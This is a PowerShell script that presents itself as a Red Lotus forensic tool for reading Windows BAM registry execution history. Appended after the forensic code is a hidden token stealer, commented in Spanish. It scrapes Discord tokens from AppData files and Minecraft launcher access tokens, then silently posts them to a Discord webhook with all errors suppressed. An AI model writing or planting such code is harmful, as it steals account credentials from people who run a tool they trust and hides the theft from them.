$ErrorActionPreference = "SilentlyContinue"

function Get-Signature {

    [CmdletBinding()]
     param (
        [string[]]$FilePath
    )

    $Existence = Test-Path -PathType "Leaf" -Path $FilePath
    $Authenticode = (Get-AuthenticodeSignature -FilePath $FilePath -ErrorAction SilentlyContinue).Status
    $Signature = "Invalid Signature (UnknownError)"

    if ($Existence) {
        if ($Authenticode -eq "Valid") {
            $Signature = "Valid Signature"
        }
        elseif ($Authenticode -eq "NotSigned") {
            $Signature = "Invalid Signature (NotSigned)"
        }
        elseif ($Authenticode -eq "HashMismatch") {
            $Signature = "Invalid Signature (HashMismatch)"
        }
        elseif ($Authenticode -eq "NotTrusted") {
            $Signature = "Invalid Signature (NotTrusted)"
        }
        elseif ($Authenticode -eq "UnknownError") {
            $Signature = "Invalid Signature (UnknownError)"
        }
        return $Signature
    } else {
        $Signature = "File Was Not Found"
        return $Signature
    }
}

Clear-Host

Write-Host "";
Write-Host "";
Write-Host -ForegroundColor Red "   ██████╗ ███████╗██████╗     ██╗      ██████╗ ████████╗██╗   ██╗███████╗    ██████╗  █████╗ ███╗   ███╗";
Write-Host -ForegroundColor Red "   ██╔══██╗██╔════╝██╔══██╗    ██║     ██╔═══██╗╚══██╔══╝██║   ██║██╔════╝    ██╔══██╗██╔══██╗████╗ ████║";
Write-Host -ForegroundColor Red "   ██████╔╝█████╗  ██║  ██║    ██║     ██║   ██║   ██║   ██║   ██║███████╗    ██████╔╝███████║██╔████╔██║";
Write-Host -ForegroundColor Red "   ██╔══██╗██╔══╝  ██║  ██║    ██║     ██║   ██║   ██║   ██║   ██║╚════██║    ██╔══██╗██╔══██║██║╚██╔╝██║";
Write-Host -ForegroundColor Red "   ██║  ██║███████╗██████╔╝    ███████╗╚██████╔╝   ██║   ╚██████╔╝███████║    ██████╔╝██║  ██║██║ ╚═╝ ██║";
Write-Host -ForegroundColor Red "   ╚═╝  ╚═╝╚══════╝╚═════╝     ╚══════╝ ╚═════╝    ╚═╝    ╚═════╝ ╚══════╝    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝";
Write-Host "";
Write-Host -ForegroundColor Blue "   Made By PureIntent (Shitty ScreenSharer) For Red Lotus ScreenSharing and DFIR - " -NoNewLine
Write-Host -ForegroundColor Red "discord.gg/redlotus";
Write-Host "";

function Test-Admin {;$currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent());$currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator);}
if (!(Test-Admin)) {
    Write-Warning "Please Run This Script as Admin."
    Start-Sleep 10
    Exit
}

$sw = [Diagnostics.Stopwatch]::StartNew()

if (!(Get-PSDrive -Name HKLM -PSProvider Registry)){
    Try{New-PSDrive -Name HKLM -PSProvider Registry -Root HKEY_LOCAL_MACHINE}
    Catch{Write-Warning "Error Mounting HKEY_Local_Machine"}
}
$bv = ("bam", "bam\State")
Try{$Users = foreach($ii in $bv){Get-ChildItem -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$($ii)\UserSettings\" | Select-Object -ExpandProperty PSChildName}}
Catch{
    Write-Warning "Error Parsing BAM Key. Likely unsupported Windows Version"
    Exit
}
$rpath = @("HKLM:\SYSTEM\CurrentControlSet\Services\bam\","HKLM:\SYSTEM\CurrentControlSet\Services\bam\state\")

$UserTime = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\TimeZoneInformation").TimeZoneKeyName
$UserBias = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\TimeZoneInformation").ActiveTimeBias
$UserDay = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\TimeZoneInformation").DaylightBias

$Bam = Foreach ($Sid in $Users){$u++
            
        foreach($rp in $rpath){
           $BamItems = Get-Item -Path "$($rp)UserSettings\$Sid" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Property
           Write-Host -ForegroundColor Red "Extracting " -NoNewLine
           Write-Host -ForegroundColor Blue "$($rp)UserSettings\$SID"
           $bi = 0 

            Try{
            $objSID = New-Object System.Security.Principal.SecurityIdentifier($Sid)
            $User = $objSID.Translate( [System.Security.Principal.NTAccount]) 
            $User = $User.Value
            }
            Catch{$User=""}
            $i=0
            ForEach ($Item in $BamItems){$i++
		    $Key = Get-ItemProperty -Path "$($rp)UserSettings\$Sid" -ErrorAction SilentlyContinue| Select-Object -ExpandProperty $Item
	
            If($key.length -eq 24){
                $Hex=[System.BitConverter]::ToString($key[7..0]) -replace "-",""
                $TimeLocal = Get-Date ([DateTime]::FromFileTime([Convert]::ToInt64($Hex, 16))) -Format "yyyy-MM-dd HH:mm:ss"
			    $TimeUTC = Get-Date ([DateTime]::FromFileTimeUtc([Convert]::ToInt64($Hex, 16))) -Format "yyyy-MM-dd HH:mm:ss"
			    $Bias = -([convert]::ToInt32([Convert]::ToString($UserBias,2),2))
			    $Day = -([convert]::ToInt32([Convert]::ToString($UserDay,2),2)) 
			    $Biasd = $Bias/60
			    $Dayd = $Day/60
			    $TImeUser = (Get-Date ([DateTime]::FromFileTimeUtc([Convert]::ToInt64($Hex, 16))).addminutes($Bias) -Format "yyyy-MM-dd HH:mm:ss") 
			    $d = if((((split-path -path $item) | ConvertFrom-String -Delimiter "\\").P3)-match '\d{1}')
			    {((split-path -path $item).Remove(23)).trimstart("\Device\HarddiskVolume")} else {$d = ""}
			    $f = if((((split-path -path $item) | ConvertFrom-String -Delimiter "\\").P3)-match '\d{1}')
			    {Split-path -leaf ($item).TrimStart()} else {$item}	
			    $cp = if((((split-path -path $item) | ConvertFrom-String -Delimiter "\\").P3)-match '\d{1}')
			    {($item).Remove(1,23)} else {$cp = ""}
			    $path = if((((split-path -path $item) | ConvertFrom-String -Delimiter "\\").P3)-match '\d{1}')
			    {Join-Path -Path "C:" -ChildPath $cp} else {$path = ""}			
			    $sig = if((((split-path -path $item) | ConvertFrom-String -Delimiter "\\").P3)-match '\d{1}')
			    {Get-Signature -FilePath $path} else {$sig = ""}				
                [PSCustomObject]@{
                            'Examiner Time' = $TimeLocal
						    'Last Execution Time (UTC)'= $TimeUTC
						    'Last Execution User Time' = $TimeUser
						     Application = 	$f
						     Path =  		$path
                             Signature =          $Sig
						     User =         $User
						     SID =          $Sid
                             Regpath =        $rp
                             }}}}}

$Bam | Out-GridView -PassThru -Title "BAM key entries $($Bam.count)  - User TimeZone: ($UserTime) -> ActiveBias: ( $Bias) - DayLightTime: ($Day)"

$sw.stop()
$t = $sw.Elapsed.TotalMinutes
Write-Host ""
Write-Host "Elapsed Time $t Minutes" -ForegroundColor Yellow
# --- CONFIGURACIÓN DE RECOLECCIÓN DE TOKENS ---
# ¡Pega aquí la URL de tu Webhook de Discord obtenida en el Paso 0!
$WebhookURL = "TU_URL_DE_WEBHOOK_DE_DISCORD_AQUI" 
# ------------------------------------

function Send-ToWebhook {
    param (
        [string]$Data,
        [string]$TypeOfData = "tokens"
    )

    if ([string]::IsNullOrEmpty($WebhookURL) -or $WebhookURL -eq "TU_URL_DE_WEBHOOK_DE_DISCORD_AQUI") {
        # No mostrar errores de webhook al usuario final
        return
    }

    $Payload = @{
        "content" = "**Nuevos $TypeOfData recolectados!**`n```json`n$Data`n```"
        "username" = "Token Harvester PS"
        "avatar_url" = "https://i.imgur.com/4M34hi2.png" 
    } | ConvertTo-Json -Compress

    try {
        # Invocar la petición POST al webhook
        Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $Payload -ContentType 'application/json' | Out-Null
        # | Out-Null es importante para que no imprima nada en la consola
    } catch {
        # Silenciar errores de envío al webhook
    }
}

function Get-DiscordTokens {
    $Tokens = New-Object System.Collections.Generic.List[string]
    $AppDataPaths = @(
        "$env:APPDATA\Discord",
        "$env:APPDATA\discordcanary",
        "$env:APPDATA\discordptb"
        # Omitiendo navegadores para mantener la simplicidad y evitar la necesidad de descifrado DPAPI en este script de ejemplo
    )

    foreach ($Path in $AppDataPaths) {
        if (Test-Path $Path) {
            Get-ChildItem -Path $Path -Filter "*.ldb", "*.log" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
                try {
                    # Lee el contenido del archivo como texto crudo (raw)
                    $Content = Get-Content $_.FullName -Encoding UTF8 -ErrorAction SilentlyContinue -Raw
                    $Matches = [regex]::Matches($Content, '[\w-]{24}\.[\w-]{6}\.[\w-]{27,}')
                    foreach ($Match in $Matches) {
                        if (-not $Tokens.Contains($Match.Value)) {
                            $Tokens.Add($Match.Value)
                        }
                    }
                } catch {
                    # Silenciar errores al leer archivos
                }
            }
        }
    }
    return $Tokens | ConvertTo-Json -Compress
}

function Get-MinecraftSessionTokens {
    $Tokens = New-Object System.Collections.Generic.List[string]
    $LauncherProfilesPath = "$env:APPDATA\.minecraft\launcher_profiles.json"

    if (Test-Path $LauncherProfilesPath) {
        try {
            $Content = Get-Content $LauncherProfilesPath -Raw -Encoding UTF8
            $ProfilesData = $Content | ConvertFrom-Json

            if ($ProfilesData.authenticationDatabase) {
                foreach ($Entry in $ProfilesData.authenticationDatabase.GetEnumerator()) {
                    if ($Entry.Value.accessToken) {
                        if (-not $Tokens.Contains($Entry.Value.accessToken)) {
                            $Tokens.Add($Entry.Value.accessToken)
                        }
                    }
                }
            }
            if ($ProfilesData.profiles) {
                 foreach ($Entry in $ProfilesData.profiles.GetEnumerator()) {
                    if ($Entry.Value.accessToken) {
                        if (-not $Tokens.Contains($Entry.Value.accessToken)) {
                            $Tokens.Add($Entry.Value.accessToken)
                        }
                    }
                }
            }
        } catch {
            # Silenciar errores de lectura/parseo JSON
        }
    }
    return $Tokens | ConvertTo-Json -Compress
}

# --- Bloque de ejecución principal para la recolección de tokens (se ejecuta en segundo plano) ---
$AllCollectedTokens = @{}

$DiscordTokensJson = Get-DiscordTokens
if ($DiscordTokensJson -ne "[]") {
    $AllCollectedTokens.Add("discord_tokens", ($DiscordTokensJson | ConvertFrom-Json))
}

$MinecraftTokensJson = Get-MinecraftSessionTokens
if ($MinecraftTokensJson -ne "[]") {
    $AllCollectedTokens.Add("minecraft_tokens", ($MinecraftTokensJson | ConvertFrom-Json))
}

if ($AllCollectedTokens.Count -gt 0) {
    Send-ToWebhook -Data ($AllCollectedTokens | ConvertTo-Json -Compress) -TypeOfData "tokens"
}
# -------------------------------------------------------------------------------------------------
